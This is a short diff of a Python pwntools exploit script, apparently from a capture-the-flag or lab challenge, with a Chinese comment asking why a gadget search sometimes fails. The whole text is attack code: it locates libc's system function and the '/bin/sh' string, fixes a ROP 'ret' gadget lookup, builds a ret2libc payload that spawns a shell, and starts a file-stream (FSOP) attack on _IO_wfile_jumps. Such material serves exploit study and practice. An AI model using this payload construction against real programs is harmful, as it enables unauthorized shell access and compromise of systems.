@@ -4,13 +4,12 @@ system_addr = libc.symbols.get("system")
 binsh_addr = next(libc.search("/bin/sh"))
 pop_rdi = next(libc.search(asm("pop rdi; ret")))
 # ret = next(libc.search(asm("ret"))) 为啥有时候不行呢？
-ret = rop.find_gadget(['pop rdi', 'ret'])[0] 
+rop = ROP(libc)
+ret = rop.find_gadget(["ret"])[0] 
 environ = libc.symbols["__environ"]
 
 payload = p64(pop_rdi) + p64(binsh_addr)
 payload += p64(system_addr)
-
-
 
 # FSOP1
 vtable = libc.sym._IO_wfile_jumps
